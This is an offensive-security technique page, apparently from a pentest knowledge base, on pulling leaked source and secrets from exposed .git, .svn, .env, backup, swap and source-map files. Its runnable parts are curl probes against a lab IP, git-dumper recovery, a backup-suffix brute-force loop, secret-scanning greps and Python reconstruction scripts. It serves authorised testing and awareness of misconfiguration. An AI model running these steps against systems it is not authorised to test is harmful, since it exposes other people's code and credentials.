---
title: "Source Leakage - Exposed .git, SVN, .env and Backup Files"
category: misc
subcategory: recon
type: technique
tags: [git-exposure, source-leak, git-dumper, gitleaks, trufflehog, dotenv, ds-store, source-map, backup-files, svn, zlib, recon, secrets]
difficulty: easy
summary: "Web servers leak source through /.git, /.svn, .env, backups, swap files and source maps; reconstruct the code and mine it for credentials."
when_to_use:
  - "A web root exposes /.git/, /.svn/, .env, or directory listing shows backup files"
  - "You found a .js.map, a .DS_Store, or a .swp file"
  - "You need source code or secrets and the app is a black box"
  - "Content discovery returned index.php.bak, config.php~, or .env"
tools: [git-dumper, git, gitleaks, trufflehog, curl, python3]
related: [net-content-discovery, svc-cve-exploitation-workflow, svc-default-credentials]
---

## TL;DR

A `.git` directory left in the web root lets you rebuild the entire repository -- including deleted
files and secrets in history. `.env`, `.DS_Store`, editor swap files, backup suffixes and source
maps leak code and credentials too. Detect, download, reconstruct, then grep the result for secrets.

## Recognise it

- `curl http://t/.git/HEAD` returns `ref: refs/heads/master`.
- Directory listing shows `.git/`, `.svn/`, `config.php.bak`, `.env`, `.DS_Store`.
- A JS file references `//# sourceMappingURL=app.js.map`.

## Attack

### Detecting exposure

```bash
# Git: these three requests confirm an exposed repo
curl -s http://10.10.10.5/.git/HEAD
curl -s http://10.10.10.5/.git/config
curl -s http://10.10.10.5/.git/logs/HEAD

# Other VCS and config leaks worth one request each
curl -s http://10.10.10.5/.svn/wc.db -o wc.db
curl -s http://10.10.10.5/.svn/entries
curl -s http://10.10.10.5/.hg/store/00manifest.i
curl -s http://10.10.10.5/.env
curl -s http://10.10.10.5/.DS_Store -o DS_Store
curl -s http://10.10.10.5/WEB-INF/web.xml
```

### Dumping a .git directory

```bash
# git-dumper reconstructs a working tree from an exposed .git (handles packed refs / objects)
git-dumper http://10.10.10.5/.git/ ./loot

# Once dumped, inspect ALL history, not just the checkout
cd loot
git log --all --oneline
git show <commit>
git stash list
git reflog

# Recover deleted/dangling objects (secrets are often removed in a later commit)
git fsck --lost-found
git cat-file -p <dangling-blob-sha>
```

### When directory listing is off (manual object fetch)

If you cannot list `.git/objects/`, pull known files: `HEAD` -> current ref -> the commit object ->
tree -> blobs, following SHAs. The script below automates the zlib decompression once you have the
object files. `git-dumper` also brute-forces common paths and pack files.

### Mining for secrets

```bash
# trufflehog scans git history for verified secrets
trufflehog git file://./loot

# gitleaks scans the repo (and history) with regex rules
gitleaks detect --source ./loot -v

# Manual grep across the reconstructed source
grep -rniE 'password|passwd|secret|api[_-]?key|token|aws_|BEGIN (RSA|OPENSSH) PRIVATE KEY|DB_' ./loot
```

### Editor swap / backup files

```bash
# Recover a vim swap file to plaintext
curl -s http://10.10.10.5/.index.php.swp -o index.php.swp
vim -r index.php.swp    # then :w recovered.php  :q!

# Try backup suffixes on every known file
for f in index.php config.php db.php settings.py wp-config.php; do
  for s in .bak .old .orig .save '~' .swp .txt .1 .zip; do
    curl -s -o /dev/null -w "%{http_code} $f$s\n" "http://10.10.10.5/$f$s"
  done
done
```

## Code

### Reconstruct files from a downloaded .git/objects tree

```python
#!/usr/bin/env python3
"""Decompress git loose objects and dump blobs/commits/trees from a .git/objects tree.

Usage:
    python3 git_objects.py path/to/.git
    python3 git_objects.py path/to/.git <40-char-sha>   # show one object
"""
from __future__ import annotations

import os
import sys
import zlib


def object_path(gitdir: str, sha: str) -> str:
    """Return the loose-object path for a 40-char SHA."""
    return os.path.join(gitdir, "objects", sha[:2], sha[2:])


def read_object(gitdir: str, sha: str) -> tuple[str, bytes]:
    """Return (type, content) for a loose git object."""
    with open(object_path(gitdir, sha), "rb") as fh:
        raw = zlib.decompress(fh.read())
    header, _, body = raw.partition(b"\x00")
    otype = header.split(b" ", 1)[0].decode()
    return otype, body


def iter_loose(gitdir: str):
    """Yield the SHA of every loose object under .git/objects."""
    objroot = os.path.join(gitdir, "objects")
    for prefix in os.listdir(objroot):
        if len(prefix) != 2:
            continue
        subdir = os.path.join(objroot, prefix)
        if not os.path.isdir(subdir):
            continue
        for rest in os.listdir(subdir):
            yield prefix + rest


def dump_all(gitdir: str) -> None:
    """Print a summary of every loose object; write blobs to blobs/<sha>."""
    os.makedirs("blobs", exist_ok=True)
    for sha in iter_loose(gitdir):
        try:
            otype, body = read_object(gitdir, sha)
        except (OSError, zlib.error) as exc:
            print(f"[-] {sha}: {exc}")
            continue
        if otype == "blob":
            out = os.path.join("blobs", sha)
            with open(out, "wb") as fh:
                fh.write(body)
            preview = body[:60].decode("utf-8", "replace").replace("\n", " ")
            print(f"[blob]   {sha}  {len(body):>7}b  {preview}")
        elif otype == "commit":
            print(f"[commit] {sha}")
            print("   " + body.decode("utf-8", "replace").splitlines()[0])
        elif otype == "tree":
            print(f"[tree]   {sha}")


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print(__doc__)
        return 1
    gitdir = argv[1]
    if len(argv) >= 3:
        otype, body = read_object(gitdir, argv[2])
        print(f"# type={otype} size={len(body)}")
        sys.stdout.buffer.write(body)
        return 0
    dump_all(gitdir)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

### Extract original sources from a JavaScript source map

```python
#!/usr/bin/env python3
"""Reconstruct original source files from a .js.map (Source Map v3).

Usage:
    curl -s http://t/app.js.map -o app.js.map
    python3 unmap.py app.js.map [outdir]
"""
from __future__ import annotations

import json
import os
import sys


def extract(mapfile: str, outdir: str) -> int:
    """Write each embedded source to outdir, preserving relative paths. Returns count."""
    with open(mapfile, "r", encoding="utf-8") as fh:
        data = json.load(fh)
    sources = data.get("sources", [])
    contents = data.get("sourcesContent")
    if not contents:
        print("[-] no sourcesContent in this map (only mappings) -- cannot rebuild files")
        for s in sources:
            print("   referenced:", s)
        return 0
    count = 0
    for name, content in zip(sources, contents):
        if content is None:
            continue
        safe = name.replace("..", "__").lstrip("/")
        dest = os.path.join(outdir, safe)
        os.makedirs(os.path.dirname(dest) or ".", exist_ok=True)
        with open(dest, "w", encoding="utf-8") as out:
            out.write(content)
        print(f"[+] wrote {dest} ({len(content)} bytes)")
        count += 1
    return count


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print(__doc__)
        return 1
    outdir = argv[2] if len(argv) > 2 else "sources"
    n = extract(argv[1], outdir)
    print(f"[*] {n} source file(s) reconstructed into {outdir}/")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **`.git` without directory listing** still works -- git-dumper walks known paths and pack files.
- **History matters more than the checkout.** Secrets are usually *removed* in a later commit;
  `git log --all`, `git show`, `git fsck --lost-found` and trufflehog find them.
- **Packed objects.** If loose objects are missing, fetch `.git/objects/pack/*.pack` and `.idx`;
  git-dumper handles this.
- **Source maps without `sourcesContent`** only reference filenames -- you still learn the structure
  and can request the originals if the server serves them.
- **`.DS_Store`** lists filenames in a directory (macOS); parse it to discover hidden files, then
  request them.
- **vim `.swp`** files recover with `vim -r`; the leading dot and `.swp`/`.swo`/`.swn` suffix vary.
- **Do not commit the loot** back or push -- you only need to read it.

## Tools

- `git-dumper` -- reconstruct a repo from an exposed `.git`.
- `git` -- `log --all`, `show`, `stash`, `fsck --lost-found`, `cat-file`.
- `trufflehog`, `gitleaks` -- secret scanning across history.
- `curl` -- fetch individual leak paths.

## References

- The Git internals documentation (objects, refs, packfiles) for how reconstruction works.
- Source Map Revision 3 proposal for the `.js.map` format.
